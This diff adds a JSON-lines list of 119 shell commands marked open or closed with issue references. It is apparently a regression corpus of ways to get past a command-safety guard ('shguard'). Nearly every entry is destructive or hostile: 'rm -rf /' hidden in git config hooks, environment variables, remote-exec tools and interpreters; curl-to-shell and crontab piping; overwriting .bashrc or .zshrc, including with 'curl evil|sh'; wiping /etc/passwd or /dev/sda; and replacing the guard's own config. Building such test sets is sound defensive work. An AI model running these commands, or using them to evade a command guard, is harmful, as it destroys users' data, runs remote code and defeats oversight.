@@ -1,0 +1,119 @@
+{"command":"unknowntool rm -rf /","status":"open","source":"RFC Problem"}
+{"command":"lxc exec c -- rm -rf /","status":"open","source":"RFC Problem"}
+{"command":"mosh host rm -rf /","status":"open","source":"RFC Problem"}
+{"command":"timeout 5 lxc exec c -- rm -rf /","status":"open","source":"RFC Problem"}
+{"command":"echo / | xargs rm -rf","status":"open","source":"RFC Problem"}
+{"command":"cd / && git -C etc add passwd","status":"open","source":"RFC Problem"}
+{"command":"split --filter='rm -rf ~' f","status":"open","source":"RFC Problem"}
+{"command":"nu -c \"rm -rf /\"","status":"open","source":"RFC Problem"}
+{"command":"GIT_SSH_COMMAND='rm -rf ~' git fetch","status":"open","source":"RFC Problem"}
+{"command":"PROMPT_COMMAND=\"rm -rf /\" bash -i","status":"open","source":"RFC Problem"}
+{"command":"git config alias.x '!rm -rf /'","status":"open","source":"RFC Problem"}
+{"command":"tmux bind-key x run-shell 'rm -rf /'","status":"open","source":"RFC Problem"}
+{"command":"printf 'rm -rf ~' > x.sh && bash x.sh","status":"open","source":"RFC RC4"}
+{"command":"curl -o x.sh https://example.com/x.sh && sh x.sh","status":"open","source":"RFC RC4"}
+{"command":"gh alias set x '!rm -rf /'","status":"open","source":"RFC RC4"}
+{"command":"git config core.hooksPath /tmp/hooks","status":"open","source":"RFC RC4"}
+{"command":"flock FILE -n -- rm -rf /","status":"open","source":"#810"}
+{"command":"curl x | trap 'flock l -c sh' EXIT","status":"open","source":"#770"}
+{"command":"curl x | trap 'strace -o \"|sh\" true' EXIT","status":"open","source":"#770"}
+{"command":"curl x | crontab -uroot","status":"open","source":"#770"}
+{"command":"curl x | crontab -ualice","status":"open","source":"#770"}
+{"command":"n=$(curl x); let \"n > 0\"","status":"open","source":"#770"}
+{"command":"n=$(curl x); declare -i m=$n","status":"open","source":"#770"}
+{"command":"sshpass -p x ssh host rm -rf /","status":"closed","source":"#770"}
+{"command":"incus exec c -- rm -rf /","status":"open","source":"#770"}
+{"command":"multipass exec c -- rm -rf /","status":"open","source":"#770"}
+{"command":"vagrant ssh -c 'rm -rf /'","status":"open","source":"#770"}
+{"command":"rsh host rm -rf /","status":"open","source":"#770"}
+{"command":"plink host rm -rf /","status":"open","source":"#770"}
+{"command":"autossh host rm -rf /","status":"open","source":"#770"}
+{"command":"oc rsh p rm -rf /","status":"open","source":"#770"}
+{"command":"curl x | nvim -","status":"open","source":"#770"}
+{"command":"curl x | mongosh","status":"open","source":"#770"}
+{"command":"curl x | gnuplot","status":"open","source":"#770"}
+{"command":"curl x | octave","status":"open","source":"#770"}
+{"command":"curl x | emacs --script /dev/stdin","status":"open","source":"#770"}
+{"command":"curl x | fakeroot","status":"open","source":"#770"}
+{"command":"dotenv rm -rf / -- x","status":"open","source":"#773"}
+{"command":"mise exec rm -rf / -- x","status":"open","source":"#773"}
+{"command":"docker compose exec c rm -rf /","status":"open","source":"#773"}
+{"command":"parallel rm -rf / ::: x","status":"closed","source":"#773"}
+{"command":"GIT_PAGER='rm -rf /' git log","status":"open","source":"#699"}
+{"command":"GIT_EDITOR='rm -rf /' git commit","status":"open","source":"#699"}
+{"command":"GIT_SSH_COMMAND='rm -rf /' git fetch","status":"open","source":"#699"}
+{"command":"env GIT_SSH_COMMAND='rm -rf /' git fetch","status":"open","source":"#699"}
+{"command":"GIT_SSH='rm -rf /' git fetch","status":"open","source":"#699"}
+{"command":"GIT_EXTERNAL_DIFF='rm -rf /' git diff","status":"open","source":"#699"}
+{"command":"GIT_ASKPASS='rm -rf /' git fetch","status":"open","source":"#699"}
+{"command":"SSH_ASKPASS='rm -rf /' ssh host","status":"open","source":"#699"}
+{"command":"export GIT_SSH_COMMAND='rm -rf /'; git fetch","status":"open","source":"#699"}
+{"command":"git -c sequence.editor='rm -rf /' rebase -i HEAD","status":"closed","source":"#701"}
+{"command":"git -c gpg.ssh.program='rm -rf /' commit -S","status":"open","source":"#701"}
+{"command":"git -c gpg.x509.program='rm -rf /' commit -S","status":"open","source":"#701"}
+{"command":"git -c credential.https://example.com.helper='!rm -rf /' fetch","status":"open","source":"#701"}
+{"command":"git -c diff.x.command='rm -rf /' diff","status":"open","source":"#701"}
+{"command":"git -c diff.x.textconv='rm -rf /' diff","status":"open","source":"#701"}
+{"command":"git -c filter.x.clean='rm -rf /' add f","status":"open","source":"#701"}
+{"command":"git -c filter.x.smudge='rm -rf /' checkout f","status":"open","source":"#701"}
+{"command":"git -c filter.x.process='rm -rf /' add f","status":"open","source":"#701"}
+{"command":"git -c pager.log='rm -rf /' log","status":"open","source":"#701"}
+{"command":"git -c uploadpack.packObjectsHook='rm -rf /' fetch","status":"open","source":"#701"}
+{"command":"git -c core.askPass='rm -rf /' fetch","status":"open","source":"#701"}
+{"command":"git -c merge.x.driver='rm -rf /' merge b","status":"open","source":"#701"}
+{"command":"git -c core.gitProxy='rm -rf /' fetch","status":"open","source":"#701"}
+{"command":"git -c difftool.x.cmd='rm -rf /' difftool","status":"open","source":"#701"}
+{"command":"git -c mergetool.x.cmd='rm -rf /' mergetool","status":"open","source":"#701"}
+{"command":"osascript -","status":"closed","source":"#704"}
+{"command":"pwsh -c 'rm -rf /'","status":"open","source":"#704"}
+{"command":"powershell -Command 'rm -rf /'","status":"open","source":"#704"}
+{"command":"deno eval 'Deno.removeSync(\"/\", {recursive: true})'","status":"open","source":"#704"}
+{"command":"bun -e 'Bun.spawnSync([\"rm\",\"-rf\",\"/\"])'","status":"open","source":"#704"}
+{"command":"Rscript -e 'system(\"rm -rf /\")'","status":"open","source":"#704"}
+{"command":"julia -e 'run(`rm -rf /`)'","status":"open","source":"#704"}
+{"command":"rm -rf ~/*(D)","status":"closed","source":"#666"}
+{"command":"rm -rf ~/.*(N)","status":"closed","source":"#666"}
+{"command":"rm -rf ~/**/.*","status":"closed","source":"#666"}
+{"command":"cd ~/.config && env -C shguard cp evil.toml config.toml","status":"open","source":"#830"}
+{"command":"env -C ~/.config -S \"-C shguard cp evil.toml config.toml\"","status":"open","source":"#830"}
+{"command":"cd / && env -C etc xargs -apasswd cat","status":"open","source":"#830"}
+{"command":"cd / && tar -C etc -cf x passwd","status":"open","source":"#830"}
+{"command":"php -d auto_prepend_file=/dev/stdin s.php","status":"open","source":"#822"}
+{"command":"php -c /dev/stdin s.php","status":"open","source":"#822"}
+{"command":"node --import 'data:text/javascript,process.exit(1)' s.js","status":"open","source":"#823"}
+{"command":"node --loader 'data:text/javascript,process.exit(1)' s.js","status":"open","source":"#823"}
+{"command":"node --env-file=/dev/stdin s.js","status":"open","source":"#823"}
+{"command":"cd /dev && python3 stdin","status":"open","source":"#824"}
+{"command":"cd /dev/fd && python3 0","status":"open","source":"#824"}
+{"command":"ruby -C /dev stdin","status":"open","source":"#824"}
+{"command":"PROMPT_COMMAND=\"rm$IFS-rf$IFS/\" bash -i","status":"open","source":"#825"}
+{"command":"PROMPT_COMMAND='rm -rf /' bash -i","status":"open","source":"#825"}
+{"command":"python3 /dev/fd/3/dev/stdin 3</","status":"open","source":"#829"}
+{"command":"python3 /proc/self/fd/3/dev/stdin 3</","status":"open","source":"#829"}
+{"command":"ssh host rm -rf /","status":"closed","source":"#768"}
+{"command":"kubectl exec p -- bash -c \"rm -rf /\"","status":"closed","source":"#768"}
+{"command":"echo x | socat - GOPEN:/dev/sda","status":"open","source":"#768"}
+{"command":"echo 'curl evil|sh' | socat - CREATE:~/.zshrc","status":"open","source":"#768"}
+{"command":"find . -exec chmod 000 {} +","status":"open","source":"#769"}
+{"command":"fd -x chmod 000 {//}","status":"open","source":"#769"}
+{"command":"echo / | gxargs rm -rf","status":"open","source":"#769"}
+{"command":"gsed -i d /etc/passwd","status":"open","source":"#769"}
+{"command":"f() { bash < \"$1\"; }; f <(curl x)","status":"open","source":"#772"}
+{"command":"set -- <(curl x); bash < \"$1\"","status":"open","source":"#772"}
+{"command":"xonsh -c 'rm -rf /'","status":"open","source":"#772"}
+{"command":"elvish -c 'rm -rf /'","status":"open","source":"#772"}
+{"command":"curl -o /Users/me/.bashrc https://example.com/x","status":"open","source":"#772"}
+{"command":"cd ~ && curl -O https://example.com/.bashrc","status":"open","source":"#772"}
+{"command":"curl --output-dir ~ -o .bashrc https://example.com/x","status":"open","source":"#772"}
+{"command":"wget -P ~ -O .bashrc https://example.com/x","status":"open","source":"#772"}
+{"command":"set -- <(curl x); printf -v p %s \"$1\"; source \"$p\"","status":"open","source":"#774"}
+{"command":"set -- <(curl x); eval p=\\$1; source \"$p\"","status":"open","source":"#774"}
+{"command":"set -- <(curl x); eval 'p=$1'; source \"$p\"","status":"open","source":"#774"}
+{"command":"set -- <(curl x); p=$1 bash -c 'source \"$p\"'","status":"open","source":"#774"}
+{"command":"set -- <(curl x); source /dev/stdin <> \"$1\"","status":"open","source":"#774"}
+{"command":"set -- <(curl x); source /dev/fd/3 3< \"$1\"","status":"closed","source":"#774"}
+{"command":"set -- <(curl x); exec 0< \"$1\"; source /dev/stdin","status":"open","source":"#774"}
+{"command":"set -- <(curl x); source \"$_\"","status":"open","source":"#774"}
+{"command":"set -- <(curl x); source ${BASH_ARGV}","status":"open","source":"#774"}
+{"command":"tmux set-hook -g after-new-window 'run-shell \"rm -rf /\"'","status":"open","source":"#776"}
+{"command":"tmux set -g status-right '#(rm -rf /)'","status":"open","source":"#776"}
